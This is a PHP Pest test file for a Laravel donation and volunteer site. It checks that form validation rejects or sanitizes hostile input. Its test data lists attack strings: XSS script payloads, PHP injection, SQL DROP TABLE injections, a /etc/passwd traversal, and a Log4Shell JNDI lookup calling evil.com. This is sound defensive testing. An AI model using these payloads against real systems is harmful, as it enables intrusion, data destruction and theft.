<?php

use App\Http\Requests\DonationRequest;
use App\Http\Requests\VolunteerRequest;
use App\Models\City;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Support\Facades\Validator;

uses(RefreshDatabase::class);

describe('Property 14: Input Validation and Sanitization', function () {
    test('any user input submitted to the system has proper validation and sanitization applied', function () {
        // Property: For any user input submitted to the system, proper validation and sanitization should be applied to prevent security vulnerabilities
        
        $maliciousInputs = [
            '<script>alert("XSS")</script>',
            '<?php echo "PHP injection"; ?>',
            'javascript:alert("XSS")',
            '<img src=x onerror=alert("XSS")>',
            "'; DROP TABLE users; --",
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
        ];

        // Test donation form validation and sanitization
        foreach ($maliciousInputs as $maliciousInput) {
            $donationData = [
                'donor_name' => $maliciousInput,
                'donor_email' => 'test@example.com',
                'donor_phone' => '9841234567',
                'amount' => 1000,
                'currency' => 'NPR',
                'purpose' => 'homeless_care',
                'payment_method' => 'esewa',
                'notes' => $maliciousInput,
            ];

            $request = new DonationRequest();
            $validator = Validator::make($donationData, $request->rules());
            
            // Should either fail validation or sanitize the input
            if ($validator->passes()) {
                $validated = $validator->validated();
                expect($validated['donor_name'])->not->toContain('<script>');
                expect($validated['donor_name'])->not->toContain('<?php');
                expect($validated['notes'])->not->toContain('<script>');
                expect($validated['notes'])->not->toContain('<?php');
            }
        }

        // Test volunteer form validation and sanitization
        $city = City::factory()->create();
        
        foreach ($maliciousInputs as $maliciousInput) {
            $volunteerData = [
                'full_name' => $maliciousInput,
                'email' => 'volunteer@example.com',
                'phone' => '9841234567',
                'address' => $maliciousInput,
                'city_id' => $city->id,
                'skills' => $maliciousInput,
                'availability' => 'Weekends',
                'motivation' => $maliciousInput,
                'age' => 25,
                'emergency_contact_name' => 'Emergency Contact',
                'emergency_contact_phone' => '9841234568',
                'terms_accepted' => true,
            ];

            $request = new VolunteerRequest();
            $validator = Validator::make($volunteerData, $request->rules());
            
            // Should either fail validation or sanitize the input
            if ($validator->passes()) {
                $validated = $validator->validated();
                expect($validated['full_name'])->not->toContain('<script>');
                expect($validated['address'])->not->toContain('<?php');
                expect($validated['skills'])->not->toContain('<script>');
                expect($validated['motivation'])->not->toContain('<?php');
            }
        }
    });

    test('email validation prevents malicious email formats', function () {
        $maliciousEmails = [
            'test@<script>alert("XSS")</script>.com',
            'test+<script>@example.com',
            'test@example.com<script>',
            'test@example..com',
            'test@.example.com',
            'test@example.com.',
            '',
            'not-an-email',
        ];

        foreach ($maliciousEmails as $email) {
            $validator = Validator::make(['email' => $email], ['email' => 'required|email']);
            expect($validator->fails())->toBeTrue();
        }
    });

    test('phone number validation prevents malicious formats', function () {
        $maliciousPhones = [
            '<script>alert("XSS")</script>',
            '<?php echo "test"; ?>',
            'javascript:alert(1)',
            '9841234567<script>',
            '+977-98-41234567; DROP TABLE users;',
        ];

        $phoneRule = ['phone' => 'required|string|max:20|regex:/^[0-9+\-\s()]+$/'];

        foreach ($maliciousPhones as $phone) {
            $validator = Validator::make(['phone' => $phone], $phoneRule);
            expect($validator->fails())->toBeTrue();
        }

        // Valid phone numbers should pass
        $validPhones = [
            '9841234567',
            '+977-9841234567',
            '01-4567890',
            '(01) 4567890',
        ];

        foreach ($validPhones as $phone) {
            $validator = Validator::make(['phone' => $phone], $phoneRule);
            expect($validator->passes())->toBeTrue();
        }
    });

    test('amount validation prevents malicious numeric inputs', function () {
        $maliciousAmounts = [
            '<script>1000</script>',
            '1000; DROP TABLE donations;',
            '${jndi:ldap://evil.com/a}',
            'javascript:1000',
            '1000<script>',
            -1000, // Negative amounts
            0, // Zero amounts
            1000001, // Exceeds maximum
        ];

        $amountRule = ['amount' => 'required|numeric|min:10|max:1000000'];

        foreach ($maliciousAmounts as $amount) {
            $validator = Validator::make(['amount' => $amount], $amountRule);
            expect($validator->fails())->toBeTrue();
        }

        // Valid amounts should pass
        $validAmounts = [100, 1000, 50000, 999999];

        foreach ($validAmounts as $amount) {
            $validator = Validator::make(['amount' => $amount], $amountRule);
            expect($validator->passes())->toBeTrue();
        }
    });

    test('text fields are properly sanitized', function () {
        $testData = [
            'donor_name' => '<script>alert("XSS")</script>John Doe',
            'notes' => 'This is a note with <b>HTML</b> tags and <?php echo "PHP"; ?> code',
        ];

        $request = new DonationRequest();
        $request->merge($testData);
        $request->prepareForValidation();

        $sanitized = $request->all();
        
        expect($sanitized['donor_name'])->not->toContain('<script>');
        expect($sanitized['donor_name'])->not->toContain('</script>');
        expect($sanitized['notes'])->not->toContain('<b>');
        expect($sanitized['notes'])->not->toContain('<?php');
    });
});